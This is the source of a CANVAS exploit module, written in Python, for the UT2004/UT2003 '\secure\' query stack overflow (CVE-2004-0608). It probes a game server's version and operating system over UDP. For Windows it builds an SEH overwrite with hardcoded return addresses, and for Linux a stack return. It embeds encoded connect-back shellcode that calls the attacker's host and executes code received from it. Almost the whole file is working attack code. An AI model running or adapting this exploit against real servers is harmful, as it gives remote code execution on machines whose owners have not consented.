#! /usr/bin/env python

#
# CANVAS ut2004.exe Exploit 
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
import select

NAME="ut2004 \\secure\\"
DESCRIPTION="ut2004 stack overflow with \\secure\\"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Epic"
DOCUMENTATION["Repeatability"]="This is a one shot exploit - the screen freezes while you're in too."
DOCUMENTATION["Patch"]="Patched by UT Patch 3236"
DOCUMENTATION["References"]=["http://unreal.epicgames.com/IpServer.htm",
                             "http://www.securiteam.com/windowsntfocus/5BP0P0AD5W.html"]
DOCUMENTATION["Notes"]=["This has been tested largely against Windows XP Home."
                        "The exploit works regardless of \"dedicated\" mode."
                        "See www.serverspy.net for other information."]
DOCUMENTATION["OSVDBID"]="7217"
DOCUMENTATION["OSVDBURL"]="http://www.osvdb.org/7217"
DOCUMENTATION["CVE Name"] = "CVE-2004-0608"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2004-0608"
DOCUMENTATION['CVSS'] = 10.0


#QO44056 fixes this?
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"], ["Linux", "i386"] ]

NOTES="""

"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    
"""

The windows version of the dedicated server will not run under vmware. 
Gives persistant "Negative Time Delta!" errors.

"""
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=7787
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.badstring="/\\\x00\r\n\"%"
        self.ssl=0
        self.setVersions()
        self.version=0
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #for win32:
        #name, pop pop ret
        #109011e3 should work (UT2004)
        #self.versions[1]=("Windows UT2004 v3186-3204",0x109011e3,36,48) 
        self.versions[1]=("Windows UT2004 v3186-3204",0x7c3410c2L,36,48) 
        self.versions[2]=("Linux UT2004",0xbfffdad0L,36,2500) 
        #ret to engine.103011fd
        self.versions[3]=("Windows UT2003 2225",0x103011fd,36,48) 
        self.versions[4]=("Linux UT2003 2225",0xbfffdad0L,32,2500) 

    def neededListenerTypes(self):
        if self.version==0:
            self.test()
        if self.version==0:
            return []
        
        if self.versions[self.version][0].count("Windows"):
            return [canvasengine.WIN32MOSDEF]
        elif self.versions[self.version][0].count("Linux"): 
            return [canvasengine.LINUXMOSDEF]
        else:
            self.log("Do not understand version %d"%self.version)
            return []
    
    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        
        if self.version==0:
            self.localhost=localhost
            self.localport=localport
            return ""
        if self.versions[self.version][0].count("Windows"):
             sc = shellcodeGenerator.win32()
             #sc.addAttr("ForkLoad", None)
             # the to fork code
             #sc.addAttr("revert_to_self_before_importing_ws2_32", None)
             #sc.addAttr("unhandled_exception_filter",None)
             self.log("Generating shellcode with port %s and ip %s"%(localport,localhost))
             sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
             sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
             self.shellcode = sc.get()
             self.log("Raw win32 shellcode length: %d"%len(self.shellcode))
             #return self.createWin32Shellcode(self.badstring,localhost,localport)
        elif self.versions[self.version][0].count("Linux"): 
            #self.shellcode="\xcc"*500
            myshellcode=shellcodeGenerator.linux_X86()
            if localport==0:
                self.log("Why is port zero?")
                return ""
            myshellcode.addAttr("connect",{"ipaddress":localhost,"port":localport})
            myshellcode.addAttr("read_and_exec",{"fdreg": "esi"})
            self.shellcode=myshellcode.get()
       
        else:
            self.log("Cannot yet create shellcode for version %d"%self.version)
            return ""
        
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        #self.shellcode = "\xcc"+self.shellcode
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        self.log("Shellcode length: %d"%len(self.shellcode))
        if len(self.shellcode)>1020:
            self.log("Warning shellcode is %d bytes - longer than the 1020 available..."%(len(self.shellcode)))
        return self.shellcode
    
    def test(self):
        """
        Test the remote server for vulnerability
        
        At the time of this exploit, there are 3 versions
        1. 3186: the game out of the box
        2. 3204: the game with one patch
        3. 3236: the game patched against this bug
        
        The \status query gets us the gamever variable
        """
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])

        s=self.getudpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            vers=0
            s.connect((self.host, self.port))
            s.send("\\status\\")
            retList=select.select([s],[],[],4.0)
            #print "Done select"
            if s not in retList[0]: 
                return 0
            try:
                data=s.recv(500)
            except:
                data=""
            self.log("Received: %s"%data)
            dl=data.split("\\")
            try:
                ind=dl.index("gamever") #index of gamever variable
            except:
                self.log("No gamever found")
                return 0
            self.log("gamever ind=%s"%ind)
            try:
                vers=int(dl[ind+1])
            except:
                #failed for some reason, leave vers at 0
                return 0
            
            gamename=""
            ind=dl.index("gamename") #index of gamever variable
            self.log("gamename ind=%s"%ind)
            try:
                gamename=dl[ind+1]
            except:
                #failed for some reason, leave vers at 0
                pass
            #import osdetect here, and determine if it's linux or windows
            osd=canvasengine.getModule("osdetect").theexploit()
            osd.link(self)
            self.log("Running os detection routines")
            if osd.run():
                os=osd.result
            else:
                os="Unknown"
            self.log("OS Detection returned %s"%os)
            self.log("Version detected: %s:%s"%(gamename,vers))
            if gamename=="ut2004" and vers!=0 and vers<3236:
                if os=="Linux":
                    self.version=2
                elif os.count("Windows"):
                    #win32
                    self.version=1
                else:
                    self.log("Vulnerable version found, but could not determine os")
                    self.version=0 #set this to default version on failure...

            if gamename=="ut2":
                self.log("ut2003 detected")
                if os.count("Windows"):
                    self.version=3
                elif os=="Linux":
                    self.version=4
            if self.version!=0:
                self.log("Version set to %d"%self.version)
                return 1
        except:
            print "_"*50
            import traceback
            traceback.print_exc(file=sys.stdout)
            print "_"*50
            self.log("Some kind of error...")
            return 0
        return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.test()
            if self.version==0:
                self.log("Automatic versioning failed.")
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0
            else:
                self.log("Recreating shellcode...")
                if self.createShellcode(self.localhost,self.localport)==0:
                    self.log("Need shellcode to continue...did you get a listener started?")
                    return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            s=self.getudpsock()
            #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.host, self.port))
            s.send(sploitstring)
            retList=select.select([s],[],[],2.0)
            #print "Done select"
            if s not in retList[0]: 
                return 0
            data=""
            data+=s.recv(500)

            if data.count("validate"):
                self.log("Target not vulnerable...")
            self.log("Attack received: %s"%prettyprint(data))
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
        
        time.sleep(10)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
            return 0
        
    def makesploit(self):
        """
        Construct the attack
        """
        ret=""
        if self.versions[self.version][0].count("Windows"):
            #for windows we overwrite the SEH pointer and redirect to a 
            #static pop pop ret in UT2004.exe
            geteip=self.versions[self.version][1]
            eiploc=self.versions[self.version][2]
            shelloc=self.versions[self.version][3]
            ret="\\secure\\"
            ret+="A"*3000
            ret=stroverwrite(ret,intel_order(geteip),eiploc)
            ret=stroverwrite(ret,"\xeb\x04",eiploc-2)
            ret=stroverwrite(ret,self.shellcode,shelloc)
        elif self.versions[self.version][0].count("Linux"):
            self.log("Doing linux...shellcode length %d"%len(self.shellcode))
            ret=""
            ret+="A"*6000
            geteip=self.versions[self.version][1]
            eiploc=self.versions[self.version][2]
            shelloc=self.versions[self.version][3]
            self.log("Using geteip: %8.8x"%uint32(geteip))
            #ret=stroverwrite(ret,searchpattern(40),0)
            freedpointer=0x410101a0 #pointer to null
            #the freedpointer gets passed into free(). We could have exploited
            #it this way, but it didn't seem quite as simple
            ret=stroverwrite(ret,intel_order(freedpointer),48)
            ret=stroverwrite(ret,intel_order(freedpointer),44)
            ret=stroverwrite(ret,intel_order(freedpointer),16)
            #we jump right into the stack, just for fun. Even on
            #fedora core 1 this works
            ret=stroverwrite(ret,intel_order(geteip),eiploc)
            ret=stroverwrite(ret,self.shellcode,shelloc)
            ret="\\secure\\"+ret

        else:
            self.log("Did not understand version %d"%self.version)
        
        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
